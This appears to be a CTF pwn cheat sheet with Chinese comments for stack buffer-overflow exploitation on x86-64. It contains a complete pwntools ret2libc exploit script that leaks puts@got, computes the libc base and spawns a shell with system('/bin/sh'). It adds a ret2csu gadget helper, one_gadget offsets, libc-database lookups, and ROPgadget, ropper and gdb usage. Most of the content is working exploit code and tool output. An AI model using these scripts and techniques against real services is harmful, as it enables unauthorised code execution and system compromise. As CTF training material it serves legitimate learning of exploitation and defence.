

```bash
checksec --file=./vuln
# 或 pwntools 自带
python -c "from pwn import *; print(ELF('./vuln'))"
```


```python
# pwntools cyclic 模式
from pwn import *
context.arch = 'amd64'

# 1. 生成 cyclic pattern
payload = cyclic(200)

# 2. 喂给程序触发崩溃
p = process('./vuln')
p.sendline(payload)
p.wait()

# 3. 从 core dump 读 RSP 上的值
core = p.corefile
fault = core.fault_addr  # 或 core.rsp 指向的 8 字节
offset = cyclic_find(fault & 0xffffffff)  # 32-bit 模式
# 64-bit 用 cyclic_find(p64(fault)[:8])
log.info(f"offset = {offset}")
```


```python
#!/usr/bin/env python3
from pwn import *

# === 环境配置 ===
exe = './vuln'
libc_path = './libc.so.6'
HOST, PORT = 'chal.example.com', 31337

context.binary = elf = ELF(exe)
context.log_level = 'info'
libc = ELF(libc_path)

# 自动 patchelf 让本地用题目给的 libc
# patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(exe, gdbscript='''
            b *main+123
            continue
        ''')
    return process(exe)

# === Stage 1: leak libc ===
p = conn()

OFFSET = 0x48  # 通过 cyclic 测出来
pop_rdi = 0x0000000000401383  # ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
ret     = 0x000000000040101a  # 用于栈对齐

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])     # 让 puts 打印 puts@got 自己的地址
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])     # 回到 main，复用栈溢出做第二轮

p.sendlineafter(b'> ', payload)

# 接收 leak（注意 recvuntil 锚字符串，不要用 sleep）
p.recvuntil(b'bye\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked puts @ {hex(leak)}')

# 反查 libc base
libc.address = leak - libc.sym['puts']
log.success(f'libc base = {hex(libc.address)}')

# === Stage 2: ret2libc system("/bin/sh") ===
binsh    = next(libc.search(b'/bin/sh\x00'))
system   = libc.sym['system']

payload  = b'A' * OFFSET
payload += p64(ret)        # 关键：补齐 16-byte 对齐
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'> ', payload)

p.interactive()
```


```text
现象：本地能打通，远程 system 一进去就 SIGSEGV
原因：libc 的 system → do_system → 内部某处 movaps xmm0, [rsp]
       要求 rsp 16-byte 对齐
失败：你的 ROP 链跳进 system 时，rsp 末位是 0x8 而不是 0x0
修复：在 ROP 链里插一个 `ret` gadget（消耗 8 字节，让 rsp 重新对齐）
```


```text
__libc_csu_init 末尾固定 pattern：
    add  rsp, 8
    pop  rbx
    pop  rbp
    pop  r12
    pop  r13
    pop  r14
    pop  r15
    ret

中间还有：
    mov  rdx, r15  ; r15 → rdx
    mov  rsi, r14  ; r14 → rsi
    mov  edi, r13d ; r13 → rdi (低 32 位)
    call qword ptr [r12 + rbx*8]
```


```python
csu_pop = 0x40119a  # 第一段（pop rbx..r15; ret）
csu_call = 0x401180  # 第二段（mov rdx,r15; ... ; call [r12+rbx*8]）

def csu(rdi, rsi, rdx, call_target):
    p  = p64(csu_pop)
    p += p64(0)              # rbx = 0
    p += p64(1)              # rbp = 1（要使后续 cmp rbx,rbp 通过 → rbx+1 == rbp）
    p += p64(call_target)    # r12 = [r12+rbx*8] 解引用得到目标
    p += p64(rdi)            # r13
    p += p64(rsi)            # r14
    p += p64(rdx)            # r15
    p += p64(csu_call)
    p += b'\x00' * 8 * 7     # 第二段 ret 后又 pop 7 个
    return p
```


```bash
one_gadget ./libc.so.6

# 输出类似：
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
```


```python
og = [0xe3afe, 0xe3b01, 0xe3b04]
payload  = b'A' * OFFSET
payload += p64(ret)
payload += p64(libc.address + og[1])  # 挑约束能满足的那个
```


```bash
cd ~/tools/libc-database

# 用 leak 出来的 puts 和 read 地址（取后 3 位）反查
./find puts 0x6f0 read 0xfd
# 输出：libc6_2.31-0ubuntu9.9_amd64

# 拿对应 libc 的所有符号偏移
./dump libc6_2.31-0ubuntu9.9_amd64

# 下载实际 libc.so.6 到本地
ls db/libc6_2.31-0ubuntu9.9_amd64.so
```


```python
# 在线 libc-database 查询（无需本地）
from pwnlib.libcdb import search_by_symbol_offsets
libs = search_by_symbol_offsets({'puts': 0x6f0, 'read': 0xfd})
libc = ELF(libs[0])
```


```bash
# 基础：pop|ret 单 reg
ROPgadget --binary ./vuln --only "pop|ret"

# 找 syscall
ROPgadget --binary ./vuln | grep ': syscall'

# 找带特定字节
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep 'pop rdi'

# 找字符串
ROPgadget --binary ./libc.so.6 --string '/bin/sh'

# 输出 JSON 给程序解析
ROPgadget --binary ./vuln --json > gadgets.json
```


```bash
ropper --file ./vuln --search "pop rdi; ret"
ropper --file ./libc.so.6 --search "syscall"
```


```python
# pwntools 内嵌 gdb attach
p = process('./vuln')
gdb.attach(p, '''
    b *main+0x123
    b *0x401234
    commands
        telescope $rsp 20
        continue
    end
''')

# 一开始就在 gdb 里跑
p = gdb.debug('./vuln', '''
    set follow-fork-mode child
    b main
''')
```


```text
checksec               # 看保护
vmmap                  # 内存布局
telescope $rsp 30      # 栈链路（pwndbg）
stack 30               # 类似（GEF）
got                    # GOT 表
search-pattern "/bin/sh"
context                # 自动显示 reg + stack + code（默认开）
ropgadget              # 内嵌 gadget 搜索
```
